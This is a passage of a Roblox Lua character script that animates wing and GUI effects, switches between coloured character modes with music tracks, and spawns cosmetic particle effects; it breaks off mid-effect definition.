if ModeOfCharacter == "Despondency" then
HeartTrans(0)
Tears(true)
else
HeartTrans(1)
Tears(false)
end



--WING/ABOVE HEAD GUI ANIMATION
if WingStyle == "Classic" then --Normal
hahayes = hahayes + 1
desctextgr.Rotation = hahayes
linegr.Rotation = hahayes
textgr.Rotation = hahayes
textgr.Parent.Rotation = 3 * math.cos(sine/70)
img1.Rotation = 4 * math.sin(sine/70)
img1.Position = UDim2.new(0.4,0,0.2 + .06 * math.cos(sine/70),0)
img3.Rotation = img3.Rotation + DerpzMusic.PlaybackLoudness/100
img2.Rotation = hahayes*2
elseif WingStyle == "StarterMode" then --Starter Mode (Mode 1)
hahayes = hahayes + 1
desctextgr.Rotation = hahayes
linegr.Rotation = hahayes
textgr.Rotation = hahayes
textgr.Parent.Rotation = 3 * math.cos(sine/70)
img1.Rotation = 4 * math.sin(sine/70)
img1.Position = UDim2.new(0.4,0,0.2 + .06 * math.cos(sine/70),0)
img3.Rotation = img3.Rotation + DerpzMusic.PlaybackLoudness/100
img2.Rotation = hahayes*2

elseif WingStyle == "FlyingClassic" then --Flying
hahayes = hahayes + 2
desctextgr.Rotation = hahayes
linegr.Rotation = hahayes
textgr.Rotation = hahayes
textgr.Parent.Rotation = 2 * math.cos(sine/35)
img1.Rotation = 3 * math.sin(sine/35)
img1.Position = UDim2.new(0.4,0,0.2 + .04 * math.cos(sine/35),0)
img3.Rotation = img3.Rotation + DerpzMusic.PlaybackLoudness/75
img2.Rotation = hahayes*2
elseif WingStyle == "DementedStyle" then --Edgy.
hahayes = hahayes + 2
desctextgr.Rotation = hahayes
linegr.Rotation = hahayes
textgr.Rotation = hahayes
textgr.Parent.Rotation = math.random(-2,2)
img1.Rotation = math.random(-3,3)
img1.Position = UDim2.new(0.4,0,0.2 + .04 * math.cos(sine/1),0)
img3.Rotation = img3.Rotation + DerpzMusic.PlaybackLoudness/75 + math.random(-10,10)
img2.Rotation = hahayes*2 + math.random(-40,40)

elseif WingStyle == "Spinning" then --Starspin V2
hahayes = hahayes + 1
desctextgr.Rotation = hahayes
linegr.Rotation = hahayes
textgr.Rotation = hahayes
textgr.Parent.Rotation = 3 * math.cos(sine/70)
img1.Rotation = 4 * math.sin(sine/70)
img1.Position = UDim2.new(0.4,0,0.2 + .06 * math.cos(sine/70),0)
img3.Rotation = img3.Rotation + DerpzMusic.PlaybackLoudness/100
img2.Rotation = hahayes*2
elseif WingStyle == "StarSpin" then --Starspin v1 remake
hahayes = hahayes + 1
desctextgr.Rotation = hahayes
linegr.Rotation = hahayes
textgr.Rotation = hahayes
textgr.Parent.Rotation = 3 * math.cos(sine/70)
img1.Rotation = 4 * math.sin(sine/70)
img1.Position = UDim2.new(0.4,0,0.2 + .06 * math.cos(sine/70),0)
img3.Rotation = img3.Rotation + DerpzMusic.PlaybackLoudness/100
img2.Rotation = hahayes*2
elseif WingStyle == "Spiral" then --Spiral Wings
desctextgr.Rotation = hahayes
linegr.Rotation = hahayes
textgr.Rotation = hahayes
textgr.Parent.Rotation = 3 * math.cos(sine/70)
img1.Rotation = 4 * math.sin(sine/70)
img1.Position = UDim2.new(0.4,0,0.2 + .06 * math.cos(sine/70),0)
img3.Rotation = img3.Rotation + DerpzMusic.PlaybackLoudness/100
img2.Rotation = hahayes*2
hahayes = hahayes + 1
elseif WingStyle == "SpiralStatic" then --Spiral (Static) Wings
desctextgr.Rotation = hahayes
linegr.Rotation = hahayes
textgr.Rotation = hahayes
textgr.Parent.Rotation = 3 * math.cos(sine/70)
img1.Rotation = 4 * math.sin(sine/70)
img1.Position = UDim2.new(0.4,0,0.2 + .06 * math.cos(sine/70),0)
img3.Rotation = img3.Rotation + DerpzMusic.PlaybackLoudness/100
img2.Rotation = hahayes*2
hahayes = hahayes + 1
elseif WingStyle == "Galaxy" then --Galaxy/Cirno style wings
desctextgr.Rotation = hahayes
linegr.Rotation = hahayes
textgr.Rotation = hahayes
textgr.Parent.Rotation = 3 * math.cos(sine/70)
img1.Rotation = 4 * math.sin(sine/70)
img1.Position = UDim2.new(0.4,0,0.2 + .06 * math.cos(sine/70),0)
img3.Rotation = img3.Rotation + DerpzMusic.PlaybackLoudness/100
img2.Rotation = hahayes*2
hahayes = hahayes + 1

elseif WingStyle == "SpiralVisualiser" then --Spiral (Audio-Visualised) Wings
desctextgr.Rotation = hahayes
linegr.Rotation = hahayes
textgr.Rotation = hahayes
textgr.Parent.Rotation = 3 * math.cos(sine/70)
img1.Rotation = 4 * math.sin(sine/70)
img1.Position = UDim2.new(0.4,0,0.2 + .06 * math.cos(sine/70),0)
img3.Rotation = img3.Rotation + DerpzMusic.PlaybackLoudness/100
img2.Rotation = hahayes*2
hahayes = hahayes + DerpzMusic.PlaybackLoudness/200

else
end


--COLOR LOOPS
if CanLoop == true then
if ModeOfCharacter == "Exasperation" then
if APEXRARE then

else
ModeSwitchLoop({

Name = "Exasperation",
desc = "You're in for a hell of a ride.",
font = "Ubuntu",
modestring = "Exasperation",
wcol1 = Color3.fromRGB(155 + 100 * math.sin(sine/10),0,0),
wcol2 = Color3.fromRGB(0,0,155 + 100 * math.sin(sine/10)),
wcorecol1 = Color3.fromRGB(155 + 100 * math.sin(sine/10),0,0),
wcorecol2 = Color3.fromRGB(0,0,155 + 100 * math.sin(sine/10)),
eyecol1 = Color3.fromRGB(0,0,155 + 100 * math.sin(sine/10)),
eyecol2 = Color3.fromRGB(0,0,155 + 100 * math.sin(sine/10)),
wtr1 = 0,
wtr2 = math.random(5,6)/10,
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.Neon,
wstyle = "StarterMode",
txtg1 = ColorSequence.new(Color3.fromRGB(0,0,155 + 100 * math.sin(sine/10)),Color3.fromRGB(155 + 100 * math.cos(sine/10),0,0)),
txtg2 = ColorSequence.new(Color3.fromRGB(155 + 100 * math.cos(sine/10),0,0)),Color3.fromRGB(0,0,155 + 100 * math.sin(sine/10)),
txtg3 = ColorSequence.new(Color3.fromRGB(0,0,155 + 100 * math.sin(sine/10)),Color3.fromRGB(155 + 100 * math.cos(sine/10),0,0)),
emotion = Upset(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
end
elseif ModeOfCharacter == "Ambivalent" then
if YOUAREDEAD == false or YOUAREDEAD == "False?" then
ModeSwitchLoop({

Name = "Ambivalent",
desc = "The most joyful you can ever be.",
font = Enum.Font.IndieFlower,
modestring = "Ambivalent",
wcol1 = Color3.new(0, 0.45, 1),
wcol2 = Color3.new(1, 1, 1),
wcorecol1 = Color3.new(1, 1, 1),
wcorecol2 = Color3.new(0, 0.45, 1),
eyecol1 = Color3.fromRGB(0,255,255),
eyecol2 = Color3.fromRGB(0,255,255),
wtr1 = 0,
wtr2 = 0,
wstyle = "Classic",
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Glass,
CoreMat = Enum.Material.Neon,
txtg1 = ColorSequence.new(Color3.new(0,.5,1),Color3.new(1,1,1)),
txtg2 = ColorSequence.new(Color3.new(1,1,1),Color3.new(0,.5,1)),
txtg3 = ColorSequence.new(Color3.new(0,.5,1),Color3.new(1,0.2,0.2)),
musicid = 2878403701,
musicname = "Kobaryo - Joyful Virus",
musicpit = 1.02,
musicvol = 1,
musicpos = "DontChange",
ws = 16,
jp = 100,
emotion = Happy(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
elseif YOUAREDEAD == true then
ModeSwitchLoop({

Name = "AMBIVALENT",
desc = "...Right?",
font = Enum.Font.Creepster,
modestring = "Ambivalent",
wcol1 = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),
wcol2 = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),
wcorecol1 = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),
wcorecol2 = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),
eyecol1 = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),
eyecol2 = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),
wtr1 = math.random(0,1),
wtr2 = math.random(0,1),
WingMat1 = Enum.Material.Neon,
WingMat2 = Enum.Material.Neon,
CoreMat = Enum.Material.Neon,
wstyle = "DementedStyle",
txtg1 = ColorSequence.new(Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))),
txtg2 = ColorSequence.new(Color3.new(1,1,1),Color3.new(1,0,0)),
txtg3 =ColorSequence.new(Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))),
musicid = 2878403701,
musicname = "Kobaryo - Villan Virus",
musicpit = 1.02,
musicvol = 1,
musicpos = "DontChange",
ws = 16,
jp = 100,
emotion = TrulyInsane(),
ExtraOptions = true,
--Extra options
Unleashed = true,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
end
elseif ModeOfCharacter == "Exstatic" then
ModeSwitchLoop({

Name = "Exstatic",
desc = "Party Maniac.",
font = "FredokaOne",
modestring = "Exstatic",
wcol1 = Color3.fromRGB(0,DerpzMusic.PlaybackLoudness/5,DerpzMusic.PlaybackLoudness/5),
wcol2 = Color3.fromRGB(0,0,DerpzMusic.PlaybackLoudness/5),
wcorecol1 = Color3.fromRGB(0,0,DerpzMusic.PlaybackLoudness/5),
wcorecol2 = Color3.fromRGB(0,DerpzMusic.PlaybackLoudness/5,DerpzMusic.PlaybackLoudness/5),
eyecol1 = Color3.fromRGB(0,0,DerpzMusic.PlaybackLoudness/5),
eyecol2 = Color3.fromRGB(0,0,DerpzMusic.PlaybackLoudness/5),
wtr1 = 0,
wtr2 = 0,
wstyle = "Galaxy",
txtg1 = ColorSequence.new(Color3.fromRGB(0,DerpzMusic.PlaybackLoudness/5,DerpzMusic.PlaybackLoudness/5),Color3.fromRGB(0,0,DerpzMusic.PlaybackLoudness/5)),
txtg2 = ColorSequence.new(Color3.fromRGB(0,0,DerpzMusic.PlaybackLoudness/5),Color3.fromRGB(0,DerpzMusic.PlaybackLoudness/5,DerpzMusic.PlaybackLoudness/5)),
txtg3 = ColorSequence.new(Color3.fromRGB(0,DerpzMusic.PlaybackLoudness/5,DerpzMusic.PlaybackLoudness/5),Color3.fromRGB(0,0,DerpzMusic.PlaybackLoudness/5)),
musicid = 4862131378,
musicname = "Geoxor & Canonblade - Sakura",
musicpit = 1.05,
musicvol = 1,
musicpos = "DontChange",
ws = 40,
jp = 100,
emotion = Happy(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})

elseif ModeOfCharacter == "Demented" then
local hahaedgemetersgobrrrr = math.random(0,255)
ModeSwitchLoop({

Name = "Schizophrenic",
desc = "I guess... Twisted in the head.",
font = "Arcade",
modestring = "Demented",
wcol1 = Color3.fromRGB(hahaedgemetersgobrrrr,hahaedgemetersgobrrrr,hahaedgemetersgobrrrr),
wcol2 = Color3.fromRGB(hahaedgemetersgobrrrr,hahaedgemetersgobrrrr,hahaedgemetersgobrrrr),
wcorecol1 = Color3.fromRGB(hahaedgemetersgobrrrr,hahaedgemetersgobrrrr,hahaedgemetersgobrrrr),
wcorecol2 = Color3.fromRGB(hahaedgemetersgobrrrr,hahaedgemetersgobrrrr,hahaedgemetersgobrrrr),
eyecol1 = Color3.fromRGB(100,0,0),
eyecol2 = Color3.fromRGB(100,0,0),
wtr1 = math.random(0,.5),
wtr2 = math.random(0,.5),
wstyle = "DementedStyle",
txtg1 = ColorSequence.new(Color3.fromRGB(hahaedgemetersgobrrrr,hahaedgemetersgobrrrr,hahaedgemetersgobrrrr),Color3.fromRGB(hahaedgemetersgobrrrr,hahaedgemetersgobrrrr,hahaedgemetersgobrrrr)),
txtg2 = ColorSequence.new(Color3.fromRGB(hahaedgemetersgobrrrr,hahaedgemetersgobrrrr,hahaedgemetersgobrrrr),Color3.fromRGB(hahaedgemetersgobrrrr,hahaedgemetersgobrrrr,hahaedgemetersgobrrrr)),
txtg3 = ColorSequence.new(Color3.fromRGB(hahaedgemetersgobrrrr,hahaedgemetersgobrrrr,hahaedgemetersgobrrrr),Color3.fromRGB(hahaedgemetersgobrrrr,hahaedgemetersgobrrrr,hahaedgemetersgobrrrr)),
musicid = 5857098165,
musicname = "RIOT - Overkill",
musicpit = 1,
musicvol = 1,
musicpos = "DontChange",
ws = 16,
jp = 100,
emotion = Insane(),
ExtraOptions = false,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
elseif ModeOfCharacter == "Demented+" then
ModeSwitchLoop({

Name = "DEMENTED",
desc = "Woah, why are we referencing past core versions now?",
font = "Arcade",
modestring = "Demented+",
wcol1 = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),
wcol2 = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),
wcorecol1 = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),
wcorecol2 = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),
eyecol1 = Color3.fromRGB(math.random(0,255),0,0),
eyecol2 = Color3.fromRGB(math.random(0,255),0,0),
wtr1 = math.random(0,.5),
wtr2 = math.random(0,.5),
wstyle = "DementedStyle",
txtg1 = ColorSequence.new(Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))),
txtg2 = ColorSequence.new(Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))),
txtg3 = ColorSequence.new(Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255)),Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))),
musicid = 4027028379,
musicname = "RIOT - Overkill (AXEN Remix)",
musicpit = 1,
musicvol = 1,
musicpos = "DontChange",
ws = 40,
jp = 100,
emotion = TrulyInsane(),
ExtraOptions = true,
--Extra options
Unleashed = true,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
elseif ModeOfCharacter == "Determined" then
ModeSwitchLoop({

Name = "Determined",
desc = "To be resolute is to- Wait... This isn't resolute...",
font = "Arcade",
modestring = "Determined",
wcol1 = Color3.fromRGB(155 + 100 * math.sin(sine/5),0,0),
wcol2 = Color3.fromRGB(155 + 100 * math.cos(sine/5),0,0),
wcorecol1 = Color3.fromRGB(155 + 100 * math.cos(sine/5),0,0),
wcorecol2 = Color3.fromRGB(155 + 100 * math.sin(sine/5),0,0),
eyecol1 = Color3.fromRGB(155 + 100 * math.sin(sine/15),0,0),
eyecol2 = Color3.fromRGB(155 + 100 * math.sin(sine/15),0,0),
wtr1 = 0.1,
wtr2 = 0.1,
wstyle = "Classic",
txtg1 = ColorSequence.new(Color3.fromRGB(155 + 100 * math.sin(sine/5),0,0),Color3.fromRGB(155 + 100 * math.cos(sine/5),0,0)),
txtg2 = ColorSequence.new(Color3.fromRGB(155 + 100 * math.cos(sine/5),0,0),Color3.fromRGB(155 + 100 * math.sin(sine/5),0,0)),
txtg3 = ColorSequence.new(Color3.fromRGB(155 + 100 * math.sin(sine/5),0,0),Color3.fromRGB(155 + 100 * math.cos(sine/5),0,0)),
ws = 70,
jp = 900,
emotion = Determined(),
ExtraOptions = true,
--Extra options
Unleashed = true,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
elseif ModeOfCharacter == "Resolute" then
ModeSwitchLoop({

Name = "Resolute",
desc = "To be resolute is to be determined to do what you need. That includes serial murder.",
font = "Arcade",
modestring = "Resolute",
wcol1 = Color3.fromRGB(155 + 100 * math.sin(sine/5),0,0),
wcol2 = Color3.fromRGB(155 + 100 * math.cos(sine/5),0,0),
wcorecol1 = Color3.fromRGB(155 + 100 * math.cos(sine/5),0,0),
wcorecol2 = Color3.fromRGB(155 + 100 * math.sin(sine/5),0,0),
eyecol1 = Color3.fromRGB(155 + 100 * math.sin(sine/15),0,0),
eyecol2 = Color3.fromRGB(155 + 100 * math.sin(sine/15),0,0),
wtr1 = 0.1,
wtr2 = 0.1,
wstyle = "Spiral",
txtg1 = ColorSequence.new(Color3.fromRGB(155 + 100 * math.sin(sine/5),0,0),Color3.fromRGB(155 + 100 * math.cos(sine/5),0,0)),
txtg2 = ColorSequence.new(Color3.fromRGB(155 + 100 * math.cos(sine/5),0,0),Color3.fromRGB(155 + 100 * math.sin(sine/5),0,0)),
txtg3 = ColorSequence.new(Color3.fromRGB(155 + 100 * math.sin(sine/5),0,0),Color3.fromRGB(155 + 100 * math.cos(sine/5),0,0)),
ws = 70,
jp = 300,
emotion = Determined(),
ExtraOptions = true,
--Extra options
Unleashed = true,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
elseif ModeOfCharacter == "Varicolored" then
if DerpzMusic.PlaybackLoudness > 650 then
ModeSwitchLoop({

Name = "Varicolored",
desc = "I think you gave him a bit too much power there pal...",
font = "Arcade",
modestring = "Varicolored",
wcol1 = Color3.fromHSV(boop(counter),1,0+DerpzMusic.PlaybackLoudness/600),
wcol2 = Color3.fromHSV(boop(counter),1,0+DerpzMusic.PlaybackLoudness/600),
wcorecol1 = Color3.fromHSV(boop(counter),1,0+DerpzMusic.PlaybackLoudness/600),
wcorecol2 = Color3.fromHSV(boop(counter),1,0+DerpzMusic.PlaybackLoudness/600),
eyecol1 = Derpz_EyeColor,
eyecol2 = Derpz_EyeColor,
wtr1 = 0,
wtr2 = 0,
wstyle = "SpiralVisualiser",
txtg1 = ColorSequence.new(Color3.fromHSV(boop(counter),1,.5*math.sin(sine/20)),Color3.fromHSV(boop(counter),1,.5*math.cos(sine/20))),
txtg2 = ColorSequence.new(Color3.fromHSV(boop(counter),1,.5*math.cos(sine/20)),Color3.fromHSV(boop(counter),1,.5*math.sin(sine/20))),
txtg3 = ColorSequence.new(Color3.fromHSV(boop(counter),1,.5*math.sin(sine/20)),Color3.fromHSV(boop(counter),1,.5*math.cos(sine/20))),
ws = 70,
jp = 100,
emotion = Peeved(),
ExtraOptions = true,
--Extra options
Unleashed = true,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
elseif DerpzMusic.PlaybackLoudness < 650 then
ModeSwitchLoop({

Name = "Varicolored",
desc = "Huh.. Seems like your favourite blue fella over here turned himself into a radio! Funniest crap i've ever seen.",
font = "Arcade",
modestring = "Varicolored",
wcol1 = Color3.fromHSV(boop(counter),1,0+DerpzMusic.PlaybackLoudness/600),
wcol2 = Color3.fromHSV(boop(counter),1,0+DerpzMusic.PlaybackLoudness/600),
wcorecol1 = Color3.fromHSV(boop(counter),1,0+DerpzMusic.PlaybackLoudness/600),
wcorecol2 = Color3.fromHSV(boop(counter),1,0+DerpzMusic.PlaybackLoudness/600),
eyecol1 = Derpz_EyeColor,
eyecol2 = Derpz_EyeColor,
wtr1 = 0,
wtr2 = 0,
wstyle = "SpiralVisualiser",
txtg1 = ColorSequence.new(Color3.fromHSV(boop(counter),1,.5*math.sin(sine/20)),Color3.fromHSV(boop(counter),1,.5*math.cos(sine/20))),
txtg2 = ColorSequence.new(Color3.fromHSV(boop(counter),1,.5*math.cos(sine/20)),Color3.fromHSV(boop(counter),1,.5*math.sin(sine/20))),
txtg3 = ColorSequence.new(Color3.fromHSV(boop(counter),1,.5*math.sin(sine/20)),Color3.fromHSV(boop(counter),1,.5*math.cos(sine/20))),
ws = 70,
jp = 100,
emotion = Happy(),
ExtraOptions = true,
--Extra options
Unleashed = false,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
end
elseif ModeOfCharacter == "Iniquitous" then
ModeSwitchLoop({

Name = "Iniquitous",
desc = "Grossly unfair, Corrupt, Morally wrong.",
font = "Ubuntu",
modestring = "Iniquitous",
wcol1 = Color3.fromRGB(math.random(0,255),0,0),
wcol2 = Color3.fromRGB(math.random(0,255),0,0),
wcorecol1 = Color3.fromRGB(math.random(0,255),0,0),
wcorecol2 = Color3.fromRGB(math.random(0,255),0,0),
eyecol1 = Color3.fromRGB(math.random(0,255),0,0),
eyecol2 = Color3.fromRGB(math.random(0,255),0,0),
wtr1 = math.random(0,10)/10,
wtr2 = math.random(0,10)/10,
wstyle = "SpiralVisualiser",
txtg1 = ColorSequence.new(Color3.fromRGB(math.random(0,255),0,0),Color3.new(1,1,1)),
txtg2 = ColorSequence.new(Color3.fromRGB(math.random(0,255),0,0),Color3.new(1,0,0)),
txtg3 = ColorSequence.new(Color3.fromRGB(math.random(0,255),0,0),Color3.fromRGB(math.random(0,255),0,0)),
musicid = 767898806,
musicname = "Virtual Riot - Rampage",
musicpit = 1,
musicvol = 1,
musicpos = "DontChange",
ws = 50,
jp = 0,
emotion = Emotionless(),
ExtraOptions = true,
--Extra options
Unleashed = true,
--Adds a DBZ-Like Effect to the character
HealthCap = 100,
--Maxes the health to a specific value, Could be used for OP modes to nerf them






})
else
--not a mode
end
else
--Can't loop
end
MainFrame.SongName.Text = "Music Name: " ..songnameboi
 counter = counter + 0.005 --This is for the rainbow function thing! Example to be used: Color3.fromHSV(boop(counter),1,1)
if youredead == false then
Humanoid.MaxHealth = math.huge
Humanoid.Health = math.huge
else

end
swait()
 sine = os.clock()*60
MainFrame.SongName.Text = "Music Name: " ..songnameboi

--Footplanting code, no need to modify anything, variable is Vec.X,Y or Z
local Walking = hum.MoveDirection.magnitude>0
local FwdDir = (Walking and hum.MoveDirection*root.CFrame.lookVector or Vector3.new())
local RigDir = (Walking and hum.MoveDirection*root.CFrame.rightVector or Vector3.new())
local Vec = {
X=RigDir.X+RigDir.Z,
Z=FwdDir.X+FwdDir.Z
};
local Divide = 1
if(Vec.Z<0)then
Divide=math.clamp(-(1.25*Vec.Z),1,2)
end
Vec.Z = Vec.Z/Divide
Vec.X = Vec.X/Divide




local torvel=(RootPart.Velocity*Vector3.new(1,0,1)).magnitude 
local velderp=RootPart.Velocity.y
hitfloor,posfloor=rayCast(RootPart.Position,(CFrame.new(RootPart.Position,RootPart.Position - Vector3.new(0,1,0))).lookVector,4,Character)
coroutine.resume(coroutine.create(function()
--Eye Blink
local randomblink = math.random(0,300)
if randomblink == 0 and blinking == false then
blinkfunction()
else
end
--Tail Movement
--if MorphedInto == "Jake_D" then
--script.Eyes.LeftEye.Color = JakeD_EyeColor
--script.Eyes.RightEye.Color = JakeD_EyeColor
--elseif MorphedInto == "Derpz" then
--script.Eyes.LeftEye.Color = Derpz_EyeColor
--script.Eyes.RightEye.Color = Derpz_EyeColor
--end
if Anim == "Idle" then
finalweld333.C1 = finalweld333.C1:lerp(cf(0 - .1 *math.cos(sine/30),0.1,-0.1 + .05 * math.cos(sine/30))*angles(math.rad(0 + 10 * math.cos(sine/40)),math.rad(0 + 10 * math.cos(sine/30)),math.rad(0 + 4 * math.cos(sine/30))),.1)
elseif Anim == "Walk" then
local wsvv = 8
local wsvv2 = 4
finalweld333.C1 = finalweld333.C1:lerp(cf(0 - .1 *math.cos(sine/wsvv/2),0.1,-0.1 + .05 * math.cos(sine/wsvv/2))*angles(math.rad(0 + 10 * math.cos(sine/wsvv2/2)),math.rad(0 + 10 * math.cos(sine/wsvv2/2)),math.rad(0 + 4 * math.cos(sine/wsvv/2))),.1)
elseif Anim == "Run" or Anim == "FasterRun" then
local wsvv = 4
local wsvv2 = 2
finalweld333.C1 = finalweld333.C1:lerp(cf(0 - .1 *math.cos(sine/wsvv/2),0.1,-0.1 + .05 * math.cos(sine/wsvv/2))*angles(math.rad(0 + 10 * math.cos(sine/wsvv2/2)),math.rad(0 + 10 * math.cos(sine/wsvv2/2)),math.rad(0 + 4 * math.cos(sine/wsvv/2))),.1)
else
finalweld333.C1 = finalweld333.C1:lerp(cf(0 - .1 *math.cos(sine/30),0.1,-0.1 + .05 * math.cos(sine/30))*angles(math.rad(0 + 10 * math.cos(sine/40)),math.rad(0 + 10 * math.cos(sine/30)),math.rad(0 + 4 * math.cos(sine/30))),.1)

end

if hitfloor ~= nil and youredead ~= true then
local rval = 0 
freefall = 0
if ModeOfCharacter == "Exasperation" then
if APEXRARE then
DerpzEff("Sphere",
{
--Put tween info here, Don't use TweenInfo
Time = 1,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(13*math.cos(sine/20),-2.5,13*math.sin(sine/20))*CFrame.Angles(0,0,0),
EndCFrame = RootPart.CFrame*CFrame.new(13*math.cos(sine/20),-2.5,13*math.sin(sine/20))*CFrame.Angles(0,0,0),
Color = Color3.new(0,0,0),
EndColor = Color3.fromRGB(255, 0, 0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(1,0,1),
EndSize = Vector3.new(7,.5,7),
Material = "Neon",
Reflectance = 0,
}
)
DerpzEff("Sphere",
{
--Put tween info here, Don't use TweenInfo
Time = 1,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(-13*math.cos(sine/20),-2.5,-13*math.sin(sine/20))*CFrame.Angles(0,0,0),
EndCFrame = RootPart.CFrame*CFrame.new(-13*math.cos(sine/20),-2.5,-13*math.sin(sine/20))*CFrame.Angles(0,0,0),
Color = Color3.fromRGB(255, 0, 0),
EndColor = Color3.new(0,0,0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(1,0,1),
EndSize = Vector3.new(9,.6,9),
Material = "Neon",
Reflectance = 0,
}
)
local rdm1 = math.random(-15,15)
local rdm2 = math.random(-15,15)
DerpzEff("Sphere",
{
--Put tween info here, Don't use TweenInfo
Time = .4,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(rdm1,-3.5,rdm2)*CFrame.Angles(0,0,0),
EndCFrame = RootPart.CFrame*CFrame.new(rdm1,10,rdm2)*CFrame.Angles(0,0,0),
Color = Color3.fromRGB(0, 0, 0),
EndColor = Color3.new(1, 0, 0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(1.5,1.5,1.5),
Material = "Neon",
Reflectance = 0,
}
)
else
DerpzEff("Block",
{
--Put tween info here, Don't use TweenInfo
Time = .4,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = Head.CFrame*CFrame.new(0,.18,-.7)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0 + math.random(-5,5))),
EndCFrame = Head.CFrame*CFrame.new(0,.18,-.7)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0 + math.random(-5,5))),
Color = Color3.new(0,0,0),
EndColor = Color3.fromRGB(155+100*math.sin(sine/10),0,0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(.1,.5,.3),
EndSize = Vector3.new(1.3,.5,.3),
Material = "Neon",
Reflectance = 0,
}
)
--WACKYEFFECT({
--Time = 20, -- Time. Duh
--EffectType = "Box", -- Effect Type. Effect Types: "Box", "Wedge", "Sphere", "Ring", "Wave", "Slash", "Swirl", "Round Slash", "Skull", "Crystal"
--Size = VT(.1,.5,.3), -- Start Size
--Size2 = VT(1.3,.5,.3), -- End Size
--Transparency = 0,-- Start Transparency
--Transparency2 = 1, -- End Transparency
--CFrame = Head.CFrame*CFrame.new(0,.18,-.7)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0 + math.random(-5,5))), -- Start CFrame
--MoveToPos = nil, -- Move to position. You must add .p at the end of a cframe. Do not use angles
--RotationX = 0, -- Rotation X
--RotationY = 0, -- Rotation Y
--RotationZ = 0, -- Rotation Z
--Material = "Neon", -- Material
--Color = Color3.fromRGB(155+100*math.sin(sine/10),0,0), -- Color (NOT BRICKCOLOR)
--SoundID = nil, -- Sound that plays while effect is being done
--SoundPitch = 0, -- Pitch
--SoundVolume = 10, -- Vol
--UseBoomerangMath = false, -- Boomerang Enabled
--Boomerang = 0, -- Makes it come back to start position
--SizeBoomerang = 50 -- Makes it come back to start size
--})
end
elseif ModeOfCharacter == "Serene" then
local rdm1 = math.random(-5,5)
local rdm2 = math.random(-5,5)
DerpzEff("Block",
{
--Put tween info here, Don't use TweenInfo
Time = 1,
EasingStyle = "Sine",
EasingDirection = "InOut",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(rdm1,-4,rdm2)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
EndCFrame = RootPart.CFrame*CFrame.new(rdm1,3,rdm2)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
